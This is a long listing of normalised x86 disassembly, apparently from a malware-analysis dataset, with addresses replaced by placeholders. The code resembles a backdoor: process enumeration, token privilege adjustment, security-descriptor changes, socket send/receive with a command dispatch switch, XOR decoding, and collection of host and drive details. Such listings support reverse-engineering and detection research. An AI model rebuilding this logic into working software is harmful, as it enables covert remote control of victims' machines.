lea eax [ ebp - 0x2c0 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x10 ]
push eax
push edi
call esi
add esp 0x18
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
push 0x0
lea eax [ ebp - 0x5c ]
push ebx
push eax
call strlen
add eax [ ebp - 0x4 ]
pop ecx
push eax
call sub_401a4a
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x6c ]
push eax
push edi
call esi
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x2c0 ]
push 0x1
push eax
lea eax [ ebp - 0x10 ]
push eax
call strlen
add eax [ ebp - 0x4 ]
pop ecx
push eax
call sub_401a4a
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c0 ]
push ebx
push eax
call strcpy
lea eax [ ebp - 0x18 ]
push eax
push edi
call esi
mov ebx eax
add esp 0x10
test ebx ebx
je r-xdata
lea eax [ ebp - 0x2c0 ]
push 0x1
push eax
lea eax [ ebp - 0x6c ]
push eax
call strlen
add eax [ ebp - 0x4 ]
pop ecx
push eax
call sub_401a4a
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push edi
call esi
mov ebx eax
pop ecx
test ebx ebx
pop ecx
je r-xdata
lea eax [ ebp - 0x2c0 ]
push 0x1
push eax
lea eax [ ebp - 0x18 ]
push eax
call strlen
pop ecx
add eax ebx
push eax
call sub_401a4a
add esp 0xc
test eax eax
je r-xdata
lea eax [ ebp - 0x4c ]
push eax
push edi
call esi
push edi
mov esi eax
call [ free@IAT ]
add esp 0xc
xor eax eax
test esi esi
setne al
lea eax [ ebp - 0x2c0 ]
push 0x1
push eax
lea eax [ ebp - 0x7c ]
push eax
call strlen
pop ecx
add eax ebx
push eax
call sub_401a4a
add esp 0xc
test eax eax
jne r-xdata
sub_4024c1
push ebp
mov ebp esp
sub esp 0x340
push ebx
xor ebx ebx
cmp [ rw-data ] 0x2
push esi
push edi
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x10 ] ebx
jne r-xdata
push ebx
push 0x2
mov [ ebp - 0xc ] ebx
call CreateToolhelp32Snapshot
mov esi [ CloseHandle@IAT ]
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
push rw-data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
mov [ ebp - 0x8 ] edi
je r-xdata
push ebx
call esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x140 ]
mov [ ebp - 0x140 ] 0x128
push eax
push ebx
call Process32First
xor eax eax
jmp r-xdata
mov esi [ GetProcAddress@IAT ]
push rw-data
push edi
call esi
push rw-data
push edi
mov [ ebp - 0x4 ] eax
call esi
cmp [ ebp - 0x4 ] ebx
mov [ ebp - 0x10 ] eax
je r-xdata
mov eax [ ebp - 0xc ]
push [ ebp - 0x8 ]
call [ FreeLibrary@IAT ]
and [ ebp - 0x340 ] 0x0
cmp [ rw-data ] 0x2
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x11c ]
push eax
lea eax [ ebp - 0x340 ]
push eax
call strcpy
pop ecx
pop ecx
push 0x410
push [ ebp - 0x138 ]
call sub_4033fc
pop ecx
mov edi eax
pop ecx
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push 0x4
push eax
push edi
call [ ebp - 0x4 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x140 ]
push eax
push ebx
call Process32Next
jmp r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x33f ]
push eax
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
push edi
call esi
jmp r-xdata
lea eax [ ebp - 0x340 ]
push 0x200
push eax
push [ ebp - 0x14 ]
push edi
call [ ebp - 0x10 ]
lea eax [ ebp - 0x340 ]
push eax
call sub_403547
pop ecx
test eax eax
je r-xdata
cmp [ rw-data ] 0x2
push [ ebp - 0x138 ]
jne r-xdata
cmp [ ebp - 0x340 ] 0x0
je r-xdata
call sub_40394e
call sub_4038f9
jmp r-xdata
pop ecx
mov [ ebp - 0xc ] 0x1
sub_402638
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi 0x9c
push edi
push 0x0
push esi
call memset
add esp 0xc
mov [ esi ] edi
mov edi [ GetVersionExA@IAT ]
push esi
call edi
test eax eax
jne r-xdata
call [ GetSystemDefaultLangID@IAT ]
mov [ rw-data ] ax
call sub_406d6a
test eax eax
je r-xdata
push esi
mov [ esi ] 0x94
call edi
push rw-data
push rw-data
jmp r-xdata
add esi 0x14
push esi
call strcat
pop ecx
pop ecx
pop edi
pop esi
retn
sub_402696
push ecx
push esi
push edi
push 0x3e800
call [ malloc@IAT ]
mov esi eax
xor edi edi
cmp esi edi
pop ecx
jne r-xdata
lea eax [ esp + 0x8 ]
push edi
push eax
push esi
push edi
push rw-data
push rw-data
push 0x50
push rw-data
call sub_4071d7
add esp 0x20
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push esi
call [ free@IAT ]
pop ecx
mov eax edi
mov eax [ esi ]
push 0x1
mov [ rw-data ] eax
pop edi
movzx eax [ esi + 0x4 ]
mov [ rw-data ] eax
movzx eax [ esi + 0x6 ]
mov [ rw-data ] eax
movzx eax [ esi + 0x8 ]
mov [ rw-data ] eax
pop edi
pop esi
pop ecx
retn
sub_402709
push ebp
mov ebp esp
push ecx
push esi
push edi
push 0x3e800
call [ malloc@IAT ]
mov esi eax
xor edi edi
cmp esi edi
pop ecx
jne r-xdata
lea eax [ ebp - 0x4 ]
push edi
push eax
push esi
push edi
push rw-data
push rw-data
push 0x50
push rw-data
call sub_4071d7
add esp 0x20
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push esi
call [ free@IAT ]
pop ecx
mov eax edi
push [ ebp - 0x4 ]
push esi
call sub_402766
pop ecx
mov edi eax
pop ecx
pop edi
pop esi
leave
retn
sub_402766
push ebx
xor ebx ebx
cmp [ esp + 0xc ] ebx
push esi
push edi
jle r-xdata
xor eax eax
mov edi [ esp + 0x10 ]
mov esi rw-data
push esi
call strlen
pop ecx
add eax ebx
mov eax [ eax + edi + 0x1 ]
xor ecx ecx
cmp eax [ rw-data ]
sete cl
mov eax ecx
jmp r-xdata
inc ebx
cmp ebx [ esp + 0x14 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + edi ]
push esi
push eax
call strcmp
pop ecx
test eax eax
pop ecx
je r-xdata
sub_4027b3
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
xor ebx ebx
test edi edi
lea eax [ edi + edi * 4 ]
lea eax [ ecx + eax * 2 ]
mov [ ebp + 0x10 ] eax
jle r-xdata
push 0x1
pop eax
mov esi edi
mov ecx [ ebp + 0x14 ]
add ebx eax
mov esi edi
sub esi ebx
lea eax [ esi + esi * 4 ]
lea eax [ ecx + eax * 2 ]
mov [ ebp + 0x10 ] eax
call [ Ordinal_WSOCK32_111@IAT ]
cmp eax 0x2733
jne r-xdata
mov eax [ ebp + 0xc ]
push 0x0
add eax ebx
push esi
push eax
push [ ebp + 0x8 ]
call [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
push [ ebp + 0x8 ]
call [ Ordinal_WSOCK32_3@IAT ]
xor eax eax
jmp r-xdata
push 0x1
call [ rw-data ]
mov eax [ ebp + 0x10 ]
dec [ ebp + 0x10 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
jmp r-xdata
cmp ebx edi
jl r-xdata
sub_402833
call [ GetTickCount@IAT ]
push 0x7530
mov [ rw-data ] eax
push [ esp + 0xc ]
push [ esp + 0xc ]
push [ rw-data ]
call sub_4027b3
add esp 0x10
test eax eax
je r-xdata
and [ rw-data ] 0x0
xor eax eax
retn
push 0x1
pop eax
retn
sub_40286b
push ebp
mov ebp esp
push ecx
push ecx
push edi
push 0x3e800
call [ malloc@IAT ]
mov edi eax
pop ecx
test edi edi
je r-xdata
pop edi
leave
retn
and [ ebp - 0x4 ] 0x0
push esi
mov esi rw-data
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x3
jl r-xdata
mov eax [ ebp - 0x8 ]
push rw-data
push edi
and [ eax + edi ] 0x0
call strcmp
pop ecx
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x8 ]
push 0x0
push eax
push edi
push 0x0
push rw-data
push rw-data
push 0x50
push esi
call sub_4071d7
add esp 0x20
test eax eax
je r-xdata
jmp r-xdata
push esi
push rw-data
call strcpy
pop ecx
pop ecx
push edi
call [ free@IAT ]
pop ecx
pop esi
sub_40290d
push rw-data
call sub_406c7c
test eax eax
pop ecx
je r-xdata
xor eax eax
retn
push rw-data
call sub_406a39
test eax eax
pop ecx
jne r-xdata
push rw-data
push rw-data
call sub_406af7
pop ecx
pop ecx
retn
sub_402974
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x10 ]
test edx edx
mov [ eax ] edx
jle r-xdata
retn
mov ecx [ esp + 0xc ]
mov eax [ esp + 0x4 ]
push esi
sub eax ecx
mov esi edx
mov dl [ eax + ecx ]
xor dl 0x23
mov [ ecx ] dl
inc ecx
dec esi
jne r-xdata
pop esi
sub_40299d
push ebp
mov ebp esp
sub esp 0x104
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xff
push eax
push rw-data
call [ GetComputerNameA@IAT ]
mov eax [ ebp - 0x4 ]
push 0xff
and [ eax + rw-data ] 0x0
lea eax [ ebp - 0x104 ]
push eax
call [ Ordinal_WSOCK32_57@IAT ]
test eax eax
jne r-xdata
push rw-data
lea eax [ ebp - 0x104 ]
push eax
call [ Ordinal_WSOCK32_52@IAT ]
test eax eax
je r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
call [ Ordinal_WSOCK32_11@IAT ]
push eax
jmp r-xdata
push rw-data
call strcpy
pop ecx
pop ecx
leave
retn
sub_402a2f
push ebp
mov ebp esp
sub esp 0x104
push esi
push edi
push rw-data
call [ LoadLibraryA@IAT ]
mov esi eax
push rw-data
push esi
call [ GetProcAddress@IAT ]
push esi
mov edi eax
call [ FreeLibrary@IAT ]
push [ rw-data ]
push [ rw-data ]
push [ rw-data ]
call memcpy
mov eax [ rw-data ]
xor esi esi
mov [ rw-data ] eax
add esp 0xc
movsx eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] esi
mov [ rw-data ] esi
call edi
mov [ rw-data ] eax
mov eax [ rw-data ]
test al 0x80
je r-xdata
cmp eax 0x4f
jg r-xdata
call sub_402cd6
jmp r-xdata
cmp eax 0x59
jg r-xdata
je r-xdata
cmp [ rw-data ] esi
push 0x1
pop edi
mov [ rw-data ] edi
je r-xdata
sub eax 0x5e
je r-xdata
je r-xdata
call sub_404446
jmp r-xdata
cmp eax 0x46
jg r-xdata
mov eax edi
pop edi
pop esi
leave
retn
mov [ rw-data ] esi
mov esi rw-data
push esi
mov [ ebp - 0x104 ] 0x5a
call strlen
add eax 0x5
push esi
mov [ ebp - 0x103 ] eax
lea eax [ ebp - 0xff ]
push eax
call strcpy
push esi
call strlen
add eax 0x5
push eax
lea eax [ ebp - 0x104 ]
push eax
call sub_4077bf
add esp 0x18
call sub_404565
sub eax 0x3
je r-xdata
call sub_40437d
jmp r-xdata
sub eax 0x52
je r-xdata
sub eax 0x47
je r-xdata
je r-xdata
call sub_405190
jmp r-xdata
dec eax
je r-xdata
call sub_4039a4
jmp r-xdata
dec eax
je r-xdata
call sub_403b63
jmp r-xdata
dec eax
je r-xdata
call sub_40392f
jmp r-xdata
sub eax 0x28
je r-xdata
call sub_405213
jmp r-xdata
dec eax
je r-xdata
call sub_404325
jmp r-xdata
dec eax
je r-xdata
call sub_403b43
jmp r-xdata
dec eax
je r-xdata
call sub_402c94
jmp r-xdata
dec eax
je r-xdata
call sub_40524b
jmp r-xdata
dec eax
je r-xdata
call sub_40513d
jmp r-xdata
dec eax
je r-xdata
call sub_403a7d
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push esi
push esi
push sub_40579f
push esi
push esi
call [ CreateThread@IAT ]
jmp r-xdata
sub eax 0x18
je r-xdata
call sub_405299
jmp r-xdata
dec eax
je r-xdata
call sub_405072
dec eax
je r-xdata
dec eax
je r-xdata
dec eax
je r-xdata
call sub_4052d1
jmp r-xdata
dec eax
je r-xdata
dec eax
je r-xdata
call sub_403985
jmp r-xdata
dec eax
dec eax
je r-xdata
call sub_403b9e
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
call sub_404832
jmp r-xdata
dec eax
jne r-xdata
call sub_403ab4
jmp r-xdata
dec eax
jne r-xdata
call sub_403603
jmp r-xdata
dec eax
je r-xdata
mov [ rw-data ] esi
jmp r-xdata
push 0x4e
call sub_404338
pop ecx
jmp r-xdata
call sub_4039c2
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_402c94
push 0x1bb
push [ rw-data ]
call sub_405d9e
pop ecx
test eax eax
pop ecx
jne r-xdata
retn
push 0x50
push [ rw-data ]
call sub_405d9e
pop ecx
test eax eax
pop ecx
jne r-xdata
push 0x15
push [ rw-data ]
call sub_405d9e
pop ecx
test eax eax
pop ecx
jne r-xdata
jmp sub_406033
sub_402cd6
mov eax [ rw-data ]
and eax 0x7f
cmp al 0x58
jne r-xdata
push 0xbb8
push [ rw-data ]
push [ rw-data ]
push [ rw-data ]
call sub_4027b3
add esp 0x10
test eax eax
jne r-xdata
push [ rw-data ]
call [ Ordinal_WSOCK32_3@IAT ]
jmp r-xdata
push 0x1
pop eax
mov [ rw-data ] eax
retn
call sub_406033
xor eax eax
retn
sub_402d24
mov eax sub_407fa0
call _EH_prolog
sub esp 0x120
mov al [ rw-data ]
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
push 0x40
mov [ ebp - 0x12c ] al
pop ecx
xor eax eax
lea edi [ ebp - 0x12b ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x24 ]
mov ebx rw-data
push eax
lea eax [ ebp - 0x12c ]
push eax
lea eax [ ebp - 0x28 ]
push eax
push rw-data
mov edi 0x80000002
xor esi esi
push ebx
push edi
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x24 ] 0x104
call [ SHGetValueA@IAT ]
cmp eax esi
jne r-xdata
lea eax [ ebp - 0x12c ]
push eax
call strlen
cmp eax 0x2
pop ecx
jbe r-xdata
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x18 ] esi
mov esi [ GetTickCount@IAT ]
call esi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x14 ] 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
call esi
mov [ ebp - 0x18 ] eax
call sub_401bc8
test eax eax
je r-xdata
push 0x0
push [ rw-data ]
call [ WaitForSingleObject@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x12c ]
push eax
call sub_4024c1
pop ecx
xor ecx ecx
test eax eax
sete cl
mov [ ebp - 0x14 ] ecx
call esi
sub eax [ ebp - 0x20 ]
cmp eax 0x493e0
jbe r-xdata
lea eax [ ebp - 0x1c ]
push 0x4
push eax
push 0x4
push rw-data
push ebx
push edi
mov [ ebp - 0x1c ] 0x1
call [ SHSetValueA@IAT ]
push 0x3e8
call [ rw-data ]
jmp r-xdata
push [ rw-data ]
call [ rw-data ]
call sub_406d38
and [ ebp - 0x14 ] 0x0
call esi
sub eax [ ebp - 0x18 ]
cmp eax 0x36ee80
jbe r-xdata
sub_402e6c
mov eax sub_407fac
call _EH_prolog
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
push esi
mov esi [ GetTickCount@IAT ]
push edi
mov [ ebp - 0x10 ] esp
call esi
mov ebx eax
mov [ rw-data ] ebx
mov ecx [ ebp - 0xc ]
push 0x1
pop eax
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
call esi
mov edi eax
sub eax ebx
cmp eax 0xea60
jbe r-xdata
call esi
sub eax [ rw-data ]
cmp eax 0x1b7740
jbe r-xdata
call sub_4073fc
mov ebx edi
push 0xa
call [ rw-data ]
jmp r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] edi
cmp [ rw-data ] 0x0
je r-xdata
sub_402eee
mov eax sub_407fb8
call _EH_prolog
push ecx
mov eax 0x2008
call sub_407dc0
push ebx
push esi
mov esi [ ebp - 0x18 ]
push edi
mov [ ebp - 0x10 ] esp
xor ebx ebx
push 0x5
mov [ ebp - 0x4 ] ebx
mov [ rw-data ] ebx
pop edi
mov al [ ebp - 0x2018 ]
sub esi edi
mov [ rw-data ] al
mov [ rw-data ] ebx
call sub_403108
cmp eax ebx
je r-xdata
push eax
lea eax [ ebp - 0x2018 ]
push eax
push [ rw-data ]
call memcpy
sub esi [ rw-data ]
add esp 0xc
cmp esi ebx
jg r-xdata
mov [ rw-data ] bl
cmp [ rw-data ] ebx
jne r-xdata
lea eax [ ebp - 0x2018 ]
push edi
push eax
push [ rw-data ]
call sub_403165
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov [ rw-data ] ebx
cmp [ rw-data ] ebx
jne r-xdata
mov [ rw-data ] 0x1
xor eax eax
jmp r-xdata
mov [ rw-data ] ebx
mov esi [ ebp - 0x2017 ]
cmp esi edi
jl r-xdata
cmp esi ebx
jg r-xdata
push 0x1
call [ rw-data ]
jmp r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
push 0x1
call [ rw-data ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
cmp [ rw-data ] bl
jne r-xdata
cmp [ ebp - 0x2018 ] 0x5a
jne r-xdata
lea eax [ ebp - 0x2018 ]
push esi
push eax
push [ rw-data ]
call sub_403165
add esp 0xc
cmp eax 0xffffffff
mov [ rw-data ] eax
jne r-xdata
mov [ rw-data ] bl
jmp r-xdata
cmp [ rw-data ] ebx
je r-xdata
mov [ rw-data ] 0x1
cmp [ ebp - 0x2018 ] 0x51
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
test [ ebp - 0x2018 ] 0x80
je r-xdata
push [ rw-data ]
call [ rw-data ]
jmp r-xdata
lea eax [ ebp - 0x2018 ]
push edi
push eax
lea eax [ ebp - 0x18 ]
push eax
call memcpy
and [ ebp - 0x18 ] 0x7f
push 0xbb8
lea eax [ ebp - 0x18 ]
push edi
push eax
push [ rw-data ]
call sub_4027b3
add esp 0x1c
cmp eax ebx
jne r-xdata
call sub_406033
jmp r-xdata
sub_4030ae
mov eax sub_407fc4
call _EH_prolog
push ecx
push ebx
push esi
push edi
xor esi esi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x4 ] esi
push 0xa
call [ rw-data ]
jmp r-xdata
mov [ rw-data ] esi
call sub_405f8e
cmp eax esi
jne r-xdata
cmp [ rw-data ] esi
je r-xdata
call sub_406033
xor eax eax
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
sub_403108
push ebp
mov ebp esp
push ecx
push edi
xor edi edi
test eax eax
jle r-xdata
call [ Ordinal_WSOCK32_111@IAT ]
cmp eax 0x2733
jne r-xdata
push 0x1
call [ rw-data ]
jmp r-xdata
cmp [ ebp - 0x1 ] 0xd
je r-xdata
xor eax eax
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1 ]
push 0x1
push eax
push [ rw-data ]
call [ Ordinal_WSOCK32_16@IAT ]
cmp eax 0xffffffff
jne r-xdata
inc edi
cmp edi 0x4
jge r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
pop edi
leave
retn
push 0x1
pop eax
jmp r-xdata
xor edi edi
jmp r-xdata
sub_403165
push ebx
push esi
push edi
mov edi [ esp + 0x18 ]
mov eax 0x2000
xor esi esi
xor ebx ebx
cmp edi eax
jle r-xdata
test edi edi
jle r-xdata
mov edi eax
mov eax edi
mov eax edi
push 0x0
sub eax esi
push eax
mov eax [ esp + 0x1c ]
add eax esi
push eax
push [ esp + 0x1c ]
call [ Ordinal_WSOCK32_16@IAT ]
test eax eax
jg r-xdata
add esi eax
xor ebx ebx
call [ Ordinal_WSOCK32_111@IAT ]
cmp eax 0x2733
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax ebx
inc ebx
cmp eax 0x1770
jg r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
push 0x1
call [ rw-data ]
cmp esi edi
jl r-xdata
sub_4031cf
push ebp
mov ebp esp
sub esp 0x488
and [ ebp - 0x4 ] 0x0
push esi
mov esi rw-data
lea eax [ ebp - 0x283 ]
push esi
push eax
mov [ ebp - 0x288 ] 0x41
call strcpy
push esi
call strlen
mov esi eax
mov eax [ rw-data ]
add esi 0x6
add esp 0xc
mov [ ebp + esi - 0x288 ] eax
lea eax [ ebp - 0x488 ]
push eax
push 0x200
add esi 0x4
call [ GetLogicalDriveStringsA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x288 ]
push esi
push eax
mov [ ebp - 0x287 ] esi
call sub_4077bf
pop ecx
pop ecx
pop esi
leave
retn
cmp [ ebp - 0x488 ] 0x0
je r-xdata
push ebx
push edi
lea edi [ ebp - 0x488 ]
and [ ebp - 0x88 ] 0x0
xor eax eax
push eax
push eax
push eax
push eax
push eax
lea eax [ ebp - 0x88 ]
push 0x80
push eax
push edi
call [ GetVolumeInformationA@IAT ]
test eax eax
jne r-xdata
push edi
call strlen
mov ebx eax
lea eax [ ebp + esi - 0x288 ]
push edi
push eax
inc ebx
call strcpy
add esp 0xc
add esi ebx
push edi
call [ GetDriveTypeA@IAT ]
cmp eax 0x2
mov [ ebp - 0x8 ] eax
je r-xdata
pop edi
pop ebx
lea eax [ ebp - 0x88 ]
push eax
lea eax [ ebp + esi - 0x288 ]
push eax
call strcpy
lea eax [ ebp - 0x88 ]
push eax
call strlen
add [ ebp - 0x4 ] ebx
lea esi [ esi + eax + 0x1 ]
mov eax [ ebp - 0x8 ]
add esp 0xc
mov [ ebp + esi - 0x288 ] eax
mov eax [ ebp - 0x4 ]
add esi 0x4
cmp [ ebp + eax - 0x488 ] 0x0
lea edi [ ebp + eax - 0x488 ]
jne r-xdata
sub_4032fb
push ebp
mov ebp esp
sub esp 0x2c
mov ecx [ ebp + 0xc ]
push ebx
mov [ ebp - 0x2c ] ecx
lea ecx [ ebp - 0xc ]
push 0x1
mov [ ebp - 0x10 ] ecx
pop eax
lea ecx [ ebp + 0xc ]
xor ebx ebx
push ecx
lea ecx [ ebp - 0x2c ]
push ebx
push ecx
push eax
mov [ ebp - 0xc ] al
mov [ ebp - 0xb ] al
mov [ ebp - 0xa ] bl
mov [ ebp - 0x9 ] bl
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] bl
mov [ ebp - 0x5 ] al
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x28 ] 0x2
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] eax
mov [ ebp + 0xc ] ebx
call SetEntriesInAclA
test eax eax
jne r-xdata
xor eax eax
push esi
push ebx
push [ ebp + 0xc ]
push ebx
push ebx
push 0x4
push 0x6
push [ ebp + 0x8 ]
call SetSecurityInfo
push [ ebp + 0xc ]
mov esi eax
call [ LocalFree@IAT ]
xor eax eax
cmp esi ebx
sete al
pop esi
jmp r-xdata
pop ebx
leave
retn
sub_403387
push ebp
mov ebp esp
sub esp 0x10
lea eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] 0x1
push eax
mov [ ebp - 0x4 ] 0x2
push [ ebp + 0xc ]
push 0x0
call [ LookupPrivilegeValueA@IAT ]
test eax eax
je r-xdata
xor eax eax
leave
retn
push 0x10
lea ecx [ ebp + 0xc ]
pop eax
push ecx
mov [ ebp + 0xc ] eax
push [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push [ ebp + 0x8 ]
call [ AdjustTokenPrivileges@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
xor ecx ecx
cmp eax 0x514
setne cl
mov eax ecx
leave
retn
sub_4033fc
push ebp
mov ebp esp
sub esp 0x220
push ebx
push esi
push edi
xor edi edi
push [ ebp + 0x8 ]
push edi
push [ ebp + 0xc ]
call [ rw-data ]
cmp eax edi
mov [ ebp - 0xc ] eax
jne r-xdata
mov eax [ ebp - 0xc ]
push [ ebp + 0x8 ]
mov ebx 0x40000
push edi
push ebx
call [ rw-data ]
mov esi [ GetCurrentProcess@IAT ]
cmp eax edi
mov [ ebp - 0x4 ] eax
jne r-xdata
push [ ebp + 0xc ]
push eax
call sub_4032fb
pop ecx
lea eax [ ebp - 0xc ]
pop ecx
push edi
push edi
push [ ebp + 0xc ]
push eax
call esi
push eax
push [ ebp - 0x4 ]
call esi
push eax
call [ DuplicateHandle@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0x28
call esi
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call [ rw-data ]
mov [ ebp - 0xc ] edi
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x20 ]
push eax
push rw-data
push [ ebp - 0x8 ]
call sub_403387
add esp 0xc
test eax eax
je r-xdata
push [ ebp - 0x8 ]
call [ rw-data ]
mov eax [ ebp - 0x4 ]
cmp eax edi
je r-xdata
push [ ebp + 0x8 ]
push edi
push 0x80000
call [ rw-data ]
cmp eax edi
mov [ ebp + 0x8 ] eax
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
push [ ebp - 0x8 ]
call sub_4033e7
pop ecx
pop ecx
lea ecx [ ebp - 0x10 ]
mov eax 0x200
push ecx
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0x220 ]
push eax
push 0x1
push [ ebp - 0x8 ]
call [ GetTokenInformation@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call [ rw-data ]
push edi
push edi
push edi
push [ ebp - 0x220 ]
push 0x1
push 0x6
push [ ebp + 0x8 ]
call SetSecurityInfo
test eax eax
jne r-xdata
push edi
push edi
lea eax [ ebp - 0x4 ]
push ebx
push eax
call esi
push eax
push [ ebp + 0x8 ]
call esi
push eax
call [ DuplicateHandle@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] edi
sub_403547
push ebp
mov ebp esp
sub esp 0x108
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx ] 0x0
je r-xdata
mov esi rw-data
push esi
call strlen
mov edi rw-data
mov [ ebp + 0x8 ] eax
push edi
call strlen
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
push esi
mov esi [ _strnicmp@IAT ]
push ebx
call esi
add esp 0x14
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
push edi
push ebx
call esi
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x108 ]
push 0x104
push eax
call [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
add eax ebx
push eax
push ebx
call strcpy
pop ecx
pop ecx
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call strcat
mov eax [ ebp + 0x8 ]
add eax ebx
push eax
lea eax [ ebp - 0x108 ]
push eax
call strcat
lea eax [ ebp - 0x108 ]
push eax
push ebx
call strcpy
add esp 0x18
jmp r-xdata
sub_403603
push ebp
mov ebp esp
mov eax 0x2744
call sub_407dc0
push ebx
push esi
push 0x5
xor esi esi
cmp [ rw-data ] 0x2
pop ebx
mov [ ebp - 0x2744 ] 0x43
mov [ ebp - 0x4 ] esi
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] esi
jne r-xdata
push 0x0
push 0x2
call [ rw-data ]
cmp eax 0xffffffff
mov [ ebp - 0x8 ] eax
je r-xdata
push rw-data
call [ LoadLibraryA@IAT ]
cmp eax esi
mov [ ebp - 0x4 ] eax
je r-xdata
mov [ ebp - 0x2743 ] ebx
jmp r-xdata
lea ecx [ ebp - 0x144 ]
mov [ ebp - 0x144 ] 0x128
push ecx
push eax
call [ rw-data ]
test eax eax
jne r-xdata
mov esi [ GetProcAddress@IAT ]
push rw-data
push eax
call esi
push rw-data
mov [ ebp - 0xc ] eax
push [ ebp - 0x4 ]
call esi
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
push edi
mov edi 0x410
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x8 ]
call [ rw-data ]
cmp [ rw-data ] 0x1
jne r-xdata
push edi
push [ ebp - 0x13c ]
call sub_4033fc
pop ecx
mov esi eax
pop ecx
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x14 ]
push 0x4
push eax
push esi
call [ ebp - 0xc ]
test eax eax
je r-xdata
lea eax [ ebp - 0x2744 ]
push ebx
push eax
mov [ ebp - 0x2743 ] ebx
call sub_4077bf
pop ecx
pop ecx
pop esi
pop ebx
leave
retn
push [ ebp - 0x4 ]
call [ FreeLibrary@IAT ]
cmp [ ebp - 0x13c ] 0x0
jne r-xdata
lea eax [ ebp - 0x120 ]
push eax
lea eax [ ebp - 0x644 ]
push eax
call strcpy
lea eax [ ebp - 0x344 ]
push 0x5c
push eax
mov [ ebp - 0x18 ] 0x100
call [ strrchr@IAT ]
inc eax
